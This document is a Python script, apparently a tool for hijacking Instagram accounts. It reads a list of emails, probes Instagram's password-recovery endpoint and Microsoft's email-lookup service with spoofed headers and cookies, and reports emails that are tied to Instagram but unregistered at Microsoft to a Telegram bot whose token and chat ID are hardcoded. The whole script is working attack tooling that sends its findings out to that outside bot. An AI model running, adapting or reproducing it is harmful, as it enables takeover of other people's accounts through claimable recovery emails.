import os
import sys
import json
import time
import requests
import sys as n
id = '1395609507'
t= '1468816115:AAEIp-9MZhDzrAiUtU-52IUyDQB-jnqFfN0'			

gg = '\033[1;31m'
ff = '\033[1;32m'
hh ='\033[1;33m'
w ='\033[1;36m'

time.sleep(1)
	
jok = 'list.txt'
file = open(jok, "r")
while True:
	jok = file.readline().split('\n')[0]
	url1 = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
	headers1 = {
	        "accept": "*/*",
	        "accept-encoding": "gzip,deflate,br",
	        "accept-language": "ar,en-US;q=0.9,en;q=0.8",
	        "content-length": "49",
	        "content-type": "application/x-www-form-urlencoded",
	        "origin": "https://www.instagram.com",
	        "referer": "https://www.instagram.com/accounts/password/reset/",
	        "user-agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
	        "x-csrftoken": "j4u26vxxC6D7eE63HhBde0ahZeN4mVfK",
	        "x-ig-app-id": "936619743392459"
	    }
	data1 = {"email_or_username":jok, "recaptcha_challenge_field": ""}
	req = requests.post(url1, headers=headers1, data=data1)

	
#	jok = file.readline().split('\n')[0]
	url = "https://mmo69.com/_check_live_email/api.php?email=" +jok
	headers = {
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                        "Connection": "close",
                        "Host": "odc.officeapps.live.com",
                        "Accept-Encoding": "gzip, deflate",
                        "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                        "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                        "uaid": "d06e1498e7ed4def9078bd46883f187b",
                        "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                    }
	j_n_q = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + jok + "&_=1604288577990"                    
		
	payload = ''
	response = requests.get (j_n_q, data=payload, headers=headers)
	
	
			
		
	if req.status_code == 200:
		print (ff+jok)
		if 'MSAccount' in response.text:
			print (gg+jok)
			print("━━━━━!!━━━━━━━")
		
		else:
			tlg =(f'https://api.telegram.org/bot{t}/sendMessage?chat_id={id}&text=\n𖤚RUKS~~متاح 👨🏻‍💻\n━━━━━━━━━━━━ \n𖤛.AMIL : {jok} \n━━━━━━━━━━━━\n.ᶜᴴ:- [@RUKS3 ☕︎︎] \n.ᵀᴱᴸᴱ:-[@DIBIBl ☕︎︎]')  
			req = requests.post(tlg) 
			
			print(ff+jok)
			print("━━━━━━++━━━━━━")
	else:
		print (gg+jok)
		print("━━━━━**━━━━━━━")

		
